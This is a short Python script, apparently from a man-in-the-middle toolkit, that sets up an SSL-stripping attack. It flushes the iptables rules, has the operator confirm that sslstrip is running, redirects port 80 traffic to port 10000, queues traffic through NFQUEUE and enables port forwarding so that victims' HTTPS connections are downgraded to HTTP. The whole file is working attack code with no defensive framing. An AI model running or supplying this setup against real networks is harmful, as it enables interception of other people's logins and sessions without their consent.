#!/usr/bin/env python3
import subprocess
import inquirer
from utils.enable_port_fwd import enable_port_fwd


def downgrade_https():
    """
    Enables queue by setting IP Tables rules to accommodate forwarding.
    """
    print("[+] Resetting IP Tables...")
    subprocess.call(["iptables", "--flush"])
    subprocess.call(["iptables", "--delete-chain"])
    subprocess.call(["iptables", "--table", "nat", "--delete-chain"])
    questions = [
        inquirer.Text(
            "confirmation",
            message="You must enable sslstrip and type 'yes' to continue.",
            validate=lambda _,
            x: x == 'yes')]
    inquirer.prompt(questions)
    print("[+] Instantiating queue...")
    subprocess.call(["iptables",
                     "-t",
                     "nat",
                     "-A",
                     "PREROUTING",
                     "-p",
                     "TCP",
                     "--destination-port",
                     "80",
                     "-j",
                     "REDIRECT",
                     "--to-port",
                     "10000"])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j",
                    "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j",
                    "NFQUEUE", "--queue-num", "0"])
    enable_port_fwd()
    print("[+] Downgraded HTTPS to HTTP.")
